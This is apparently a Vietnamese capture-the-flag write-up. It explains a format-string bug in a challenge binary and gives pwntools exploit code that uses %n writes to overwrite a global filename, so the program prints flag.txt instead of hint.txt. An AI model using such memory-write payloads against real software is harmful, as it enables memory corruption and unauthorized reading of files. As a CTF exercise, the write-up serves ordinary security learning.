**1. Find bug**
 - xem qua chương trình
 - ![image](https://user-images.githubusercontent.com/113702087/212834816-8d9003ab-2d79-415f-bf13-1cc36b4cb649.png)
 - ![image](https://user-images.githubusercontent.com/113702087/212834888-0f44f847-e9a2-41f7-be59-41b2a450b1b0.png)
 - ta thấy được lỗi overflow
 - ![image](https://user-images.githubusercontent.com/113702087/212834933-b6fff0b9-d1af-4658-9058-0b65645c24ae.png)
 - ![image](https://user-images.githubusercontent.com/113702087/212834963-17f7e201-9cac-47b7-8a09-90b205492c80.png)
 - hàm hint đọc file từ filename và in ra, ta có thể dùng fmt để thay đổi filename từ hint.txt thành flag.txt

**2. Exploit**
```
file_name = 0x404080

r.sendlineafter(b'>> ', b'1')
fmt = b'%14$n%26465c%15$hn%1285c%16$hn%1992c%17$hn%74c%18$hn'.ljust(64, b'\x00') + p64(file_name + 8) + p64(file_name + 2) + p64(file_name) + p64(file_name + 4) + p64(file_name + 6)
r.sendafter(b'payload: ', fmt)
```
 - ghi 2 byte một từ hint.txt thành flag.txt, byte thứ 9 chuyển thành byte null vì mk đọc flag tại chỗ :>
 - ![image](https://user-images.githubusercontent.com/113702087/212835820-87d0481c-419e-4ae7-917f-8c463e996ee9.png)
 - ![image](https://user-images.githubusercontent.com/113702087/212836065-89996a93-6eb5-4d61-9d99-70d7e28cc419.png)
 - Nhận flag
 - ![image](https://user-images.githubusercontent.com/113702087/212836155-49bf91b7-d9b7-4489-bc01-d8d8c744473b.png)
